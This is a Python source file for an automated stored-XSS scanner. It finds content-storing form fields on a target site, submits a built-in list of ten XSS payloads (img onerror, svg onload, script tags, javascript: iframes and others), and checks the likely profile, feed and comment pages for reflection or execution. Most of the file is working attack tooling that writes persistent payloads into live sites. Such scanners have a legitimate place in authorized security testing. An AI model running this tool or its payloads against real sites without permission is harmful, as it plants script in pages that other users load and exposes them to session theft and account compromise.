"""Stored XSS scanner with inject/retrieve flow."""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from urllib.parse import urljoin

import httpx

try:
    from bs4 import BeautifulSoup
except ImportError:  # pragma: no cover
    BeautifulSoup = None


STORED_PAYLOADS = [
    '<img src=x onerror=alert(document.domain)>',
    '<svg onload=alert(document.domain)>',
    '<details open ontoggle=alert(document.domain)>',
    '"><img src=x onerror=alert(document.domain)>',
    "'><svg onload=alert(document.domain)>",
    '<script>alert(document.domain)</script>',
    '<iframe src="javascript:alert(document.domain)">',
    '<body onload=alert(document.domain)>',
    '<input autofocus onfocus=alert(document.domain)>',
    '<video><source onerror=alert(document.domain)>',
]

# Common field names that store user content
STORAGE_FIELD_HINTS = [
    "name", "bio", "description", "comment", "body", "content",
    "title", "message", "text", "username", "display_name", "displayname",
    "about", "signature", "review", "feedback", "subject", "note",
]

DISPLAY_PATH_HINTS = [
    "/profile", "/user/", "/account", "/feed", "/activity",
    "/comment", "/review", "/post", "/dashboard", "/settings",
]


@dataclass
class StoragePoint:
    """Where user content is submitted."""
    submit_url: str
    submit_method: str  # POST / PUT / PATCH
    fields: dict[str, str]  # {field_name: field_type}
    auth_required: bool
    success_indicator: str


@dataclass
class DisplayPoint:
    """Where stored content is rendered."""
    display_url: str
    content_selectors: list[str]
    render_trigger: str  # page_load | click | scroll


@dataclass
class StorageMapping:
    """Pairs a storage point with its display points."""
    storage: StoragePoint
    displays: list[DisplayPoint]
    data_field: str


@dataclass
class InjectResult:
    success: bool
    status_code: int
    sanitized_on_save: bool
    response_snippet: str


@dataclass
class RetrieveResult:
    found: bool
    executed: bool
    display_url: str
    evidence: str


@dataclass
class StoredFinding:
    type: str = "stored"
    inject_url: str = ""
    inject_field: str = ""
    display_url: str = ""
    payload: str = ""
    sanitized_on_save: bool = False
    sanitized_on_display: bool = False
    severity: str = "P1"
    poc: str = ""
    evidence: str = ""


class StoredXSS:
    """Tests stored XSS with proper inject/retrieve flow."""

    def __init__(self, base_url: str, session: httpx.Client | None = None):
        self.base_url = base_url.rstrip("/")
        self.session = session or httpx.Client(
            timeout=30,
            follow_redirects=True,
            headers={"User-Agent": "XSSHunter/2.0"},
        )

    def scan(self, mappings: list[StorageMapping] | None = None) -> list[StoredFinding]:
        """Run full inject -> retrieve flow for all known storage mappings."""
        if mappings is None:
            mappings = self.map_storage_points()
        findings: list[StoredFinding] = []
        for mapping in mappings:
            for payload in STORED_PAYLOADS:
                inject_result = self.inject(mapping.storage, mapping.data_field, payload)
                if not inject_result.success:
                    continue
                for display in mapping.displays:
                    retrieve_result = self.retrieve(display, payload)
                    if retrieve_result.found or retrieve_result.executed:
                        findings.append(StoredFinding(
                            inject_url=mapping.storage.submit_url,
                            inject_field=mapping.data_field,
                            display_url=display.display_url,
                            payload=payload,
                            sanitized_on_save=inject_result.sanitized_on_save,
                            sanitized_on_display=not retrieve_result.executed,
                            poc=f"POST {mapping.storage.submit_url} {{{mapping.data_field}: {payload!r}}}",
                            evidence=retrieve_result.evidence,
                        ))
                        break
        return findings

    def map_storage_points(self) -> list[StorageMapping]:
        """Discover forms on the target and infer display locations."""
        mappings: list[StorageMapping] = []
        try:
            resp = self.session.get(self.base_url)
            resp.raise_for_status()
        except Exception:
            return mappings

        forms = self._extract_forms(resp.text, resp.url)
        for action, method, fields in forms:
            storage_fields = {
                name: ftype for name, ftype in fields.items()
                if any(hint in name.lower() for hint in STORAGE_FIELD_HINTS)
            }
            if not storage_fields:
                continue
            sp = StoragePoint(
                submit_url=action,
                submit_method=method.upper(),
                fields=fields,
                auth_required=False,
                success_indicator="200",
            )
            displays = self._infer_display_points(action)
            for data_field in storage_fields:
                mappings.append(StorageMapping(storage=sp, displays=displays, data_field=data_field))
        return mappings

    def inject(self, storage_point: StoragePoint, field: str, payload: str) -> InjectResult:
        """Submit payload to a storage point."""
        data = dict(storage_point.fields)
        data[field] = payload
        try:
            method = storage_point.submit_method.upper()
            if method in ("POST", "PUT", "PATCH"):
                resp = self.session.request(method, storage_point.submit_url, data=data)
            else:
                resp = self.session.get(storage_point.submit_url, params=data)
        except Exception as exc:
            return InjectResult(success=False, status_code=0, sanitized_on_save=False, response_snippet=str(exc))

        snippet = resp.text[:500]
        sanitized = payload not in resp.text
        return InjectResult(
            success=resp.status_code < 400,
            status_code=resp.status_code,
            sanitized_on_save=sanitized,
            response_snippet=snippet,
        )

    def retrieve(self, display_point: DisplayPoint, payload: str) -> RetrieveResult:
        """Navigate to display point and check if payload is present/executed."""
        try:
            resp = self.session.get(display_point.display_url)
            resp.raise_for_status()
        except Exception:
            return RetrieveResult(found=False, executed=False, display_url=display_point.display_url, evidence="")

        found = payload in resp.text
        executed = found and any(
            token in payload.lower() for token in ("onerror", "onload", "ontoggle", "onfocus", "javascript:")
        )
        evidence = self._snippet(resp.text, payload)
        return RetrieveResult(found=found, executed=executed, display_url=display_point.display_url, evidence=evidence)

    def _extract_forms(self, html_text: str, base_url) -> list[tuple[str, str, dict]]:
        forms = []
        if BeautifulSoup:
            soup = BeautifulSoup(html_text, "html.parser")
            for form in soup.find_all("form"):
                action = urljoin(str(base_url), form.get("action", ""))
                method = form.get("method", "get")
                fields = {inp.get("name", ""): inp.get("type", "text")
                          for inp in form.find_all(["input", "textarea"])
                          if inp.get("name")}
                forms.append((action, method, fields))
        return forms

    def _infer_display_points(self, submit_url: str) -> list[DisplayPoint]:
        displays = []
        for hint in DISPLAY_PATH_HINTS:
            candidate = urljoin(self.base_url, hint)
            displays.append(DisplayPoint(display_url=candidate, content_selectors=["*"], render_trigger="page_load"))
        return displays[:3]

    def _snippet(self, text: str, value: str, radius: int = 80) -> str:
        idx = text.find(value)
        if idx < 0:
            return text[:radius * 2]
        return text[max(0, idx - radius): idx + len(value) + radius].replace("\n", "\\n")
